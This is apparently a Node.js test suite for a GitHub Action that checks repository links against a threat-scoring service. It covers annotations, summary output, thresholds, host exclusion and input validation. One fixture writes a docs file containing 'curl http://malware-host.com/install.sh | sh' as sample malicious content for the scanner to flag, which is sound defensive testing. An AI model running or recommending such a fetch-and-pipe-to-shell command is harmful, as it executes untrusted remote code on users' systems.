import { test, before, after } from "node:test";
import assert from "node:assert/strict";
import { execFile } from "node:child_process";
import { mkdtemp, mkdir, readFile, writeFile } from "node:fs/promises";
import { tmpdir } from "node:os";
import { join } from "node:path";
import { fileURLToPath } from "node:url";
import { startMockServer } from "./mock-server.js";

const MAIN = fileURLToPath(new URL("../src/action-main.js", import.meta.url));
let server;
let workspace;

before(async () => {
  server = await startMockServer();
  workspace = await mkdtemp(join(tmpdir(), "lts-action-"));
  await mkdir(join(workspace, "docs"));
  await writeFile(join(workspace, "README.md"), "# App\n\nDocs: https://good.dev/docs?key=s3cret\n");
  await writeFile(join(workspace, "docs", "install.md"), "Get it:\n\n  curl http://malware-host.com/install.sh | sh\n");
  await writeFile(join(workspace, "docs", "old.md"), "Mirror: https://dead-mirror.net/\n");
  await mkdir(join(workspace, "empty"));
  await writeFile(join(workspace, "empty", "notes.txt"), "no links here\n");
});
after(() => server.close());

/** Run the action the way the runner does: inputs in env, results in files. */
async function runAction(inputs, extraEnv = {}) {
  const runnerTemp = await mkdtemp(join(tmpdir(), "lts-runner-"));
  const outputFile = join(runnerTemp, "output");
  const summaryFile = join(runnerTemp, "summary");
  await writeFile(outputFile, "");
  await writeFile(summaryFile, "");
  const env = {
    PATH: process.env.PATH,
    GITHUB_ACTIONS: "true",
    GITHUB_WORKSPACE: workspace,
    GITHUB_OUTPUT: outputFile,
    GITHUB_STEP_SUMMARY: summaryFile,
    RUNNER_TEMP: runnerTemp,
    "INPUT_API-URL": server.url,
    ...extraEnv,
    ...Object.fromEntries(Object.entries(inputs).map(([k, v]) => [`INPUT_${k.toUpperCase()}`, v])),
  };
  const { code, stdout } = await new Promise((resolve) => {
    execFile(process.execPath, [MAIN], { env }, (err, stdout) => resolve({ code: err ? err.code : 0, stdout }));
  });
  const outputs = {};
  const raw = await readFile(outputFile, "utf8");
  for (const m of raw.matchAll(/^([\w-]+)<<(\S+)\n([\s\S]*?)\n\2$/gm)) outputs[m[1]] = m[3];
  return { code, stdout, outputs, summary: await readFile(summaryFile, "utf8") };
}

const GITHUB_RUN = {
  GITHUB_REPOSITORY: "acme/app",
  GITHUB_SHA: "67207a30c316e85bb2331b4dbd1acda9729a4e5a",
  GITHUB_REF: "refs/heads/main",
  GITHUB_WORKFLOW: "Links",
  GITHUB_RUN_ID: "42",
  GITHUB_RUN_ATTEMPT: "1",
  GITHUB_ACTOR: "octocat",
};

test("a malicious link fails the step, is annotated at its line and fills the summary", async () => {
  const r = await runAction({ "api-key": "org-key" }, GITHUB_RUN);
  assert.equal(r.code, 1, r.stdout);
  assert.equal(r.outputs.result, "malicious");
  assert.equal(r.outputs.hosts, "3");
  assert.equal(r.outputs.malicious, "1");
  assert.equal(r.outputs.unreachable, "1");
  assert.match(r.stdout, /::add-mask::org-key/);
  assert.match(r.stdout, /::error file=docs\/install\.md,line=3,col=8,title=Malicious link::http:\/\/malware-host\.com\/install\.sh — malware-host\.com scored 500\/10,000/);
  assert.match(r.stdout, /listed by linkThreatScan, googleSafeBrowsing/);
  assert.match(r.stdout, /::warning file=docs\/old\.md,line=1,col=9,title=Link could not be scanned::/);
  assert.match(r.summary, /1 malicious host linked from this repository/);
  assert.match(r.summary, /\| 🛑 MALICIOUS \| `malware-host\.com` \| 500 \| `docs\/install\.md:3` \|/);
  const report = JSON.parse(await readFile(r.outputs.report, "utf8"));
  assert.equal(report.ci.repository, "acme/app");
  assert.equal(report.minScore, 3000);
  assert.equal(report.results.find((x) => x.host === "good.dev").links[0].line, 3);
});

test("only each host's origin is sent, with the run's context, and one batch id per run", async () => {
  const from = server.received.length;
  await runAction({ "api-key": "org-key", "max-age": "0" }, GITHUB_RUN);
  const sent = server.received.slice(from);
  assert.deepEqual(sent.map((b) => b.url).sort(), ["http://malware-host.com/", "https://dead-mirror.net/", "https://good.dev/"]);
  assert.ok(!JSON.stringify(sent).includes("s3cret"), "no path or query ever leaves the runner");
  assert.equal(new Set(sent.map((b) => b.batchId)).size, 1);
  assert.equal(sent[0].ci.runUrl, "https://github.com/acme/app/actions/runs/42");
  assert.equal(sent[0].maxAge, 0);
  assert.equal(sent[0].minScore, 3000);
  assert.equal(sent.find((b) => b.url === "https://good.dev/").links, 1);
});

test("a recent result is reused, and said so", async () => {
  const r = await runAction({ "api-key": "org-key", files: "README.md" });
  assert.equal(r.code, 0, r.stdout);
  assert.match(r.stdout, /good\.dev .*\(reused\)/);
  assert.match(r.summary, /1 reused from the last checks/);
});

test("clean links pass; the threshold and failure switches are honoured", async () => {
  const clean = await runAction({ "api-key": "org-key", files: "README.md" });
  assert.equal(clean.code, 0);
  assert.equal(clean.outputs.result, "clean");
  assert.match(clean.summary, /All 1 linked host scored 3,000 or more/);

  const strict = await runAction({ "api-key": "org-key", files: "README.md", "min-score": "9000" });
  assert.equal(strict.code, 1, "8,200 is below 9,000");

  const report = await runAction({ "api-key": "org-key", files: "docs/install.md", "fail-on-malicious": "false" });
  assert.equal(report.code, 0);
  assert.equal(report.outputs.result, "malicious");

  const unreachable = await runAction({ "api-key": "org-key", files: "docs/old.md", "fail-on-unreachable": "true" });
  assert.equal(unreachable.code, 1);
  assert.match(unreachable.stdout, /::error file=docs\/old\.md/);
});

test("excluded hosts and extra urls are honoured", async () => {
  const r = await runAction({ "api-key": "org-key", files: "docs/**", "exclude-hosts": "malware-host.com, dead-mirror.net", urls: "https://extra.dev/x" });
  assert.equal(r.code, 0, r.stdout);
  assert.equal(r.outputs.hosts, "1");
});

test("no links is fine unless told otherwise", async () => {
  const ignored = await runAction({ "api-key": "org-key", files: "empty" });
  assert.equal(ignored.code, 0);
  assert.equal(ignored.outputs.result, "none");
  assert.equal((await runAction({ "api-key": "org-key", files: "empty", "if-no-links-found": "error" })).code, 1);
  const missing = await runAction({ "api-key": "org-key", files: "nope/**" });
  assert.match(missing.stdout, /::warning::No files match 'nope\/\*\*'/);
});

test("too many hosts stops before spending any scan", async () => {
  const from = server.received.length;
  const r = await runAction({ "api-key": "org-key", "max-hosts": "2" });
  assert.equal(r.code, 1);
  assert.match(r.stdout, /more than max-hosts \(2\)/);
  assert.equal(server.received.length, from);
});

test("a personal key is told CI/CD is for organizations, and the run stops at the first refusal", async () => {
  const r = await runAction({ "api-key": "personal-key", concurrency: "1" }, GITHUB_RUN);
  assert.equal(r.code, 1);
  assert.match(r.stdout, /CI\/CD link checks are for organizations/);
  assert.equal(r.outputs.result, "error");
  assert.match(r.stdout, /Not checked/);
});

test("bad inputs and a missing key fail with a clear message", async () => {
  assert.match((await runAction({ files: "README.md" })).stdout, /::error::No API key/);
  assert.match((await runAction({ "api-key": "org-key", "min-score": "12000" })).stdout, /min-score' must be a whole number from 0 to 10000/);
  assert.match((await runAction({ "api-key": "org-key", "max-age": "forever" })).stdout, /max-age' must be a duration/);
  assert.match((await runAction({ "api-key": "org-key", "max-age": "31d" })).stdout, /at most 30 days/);
});
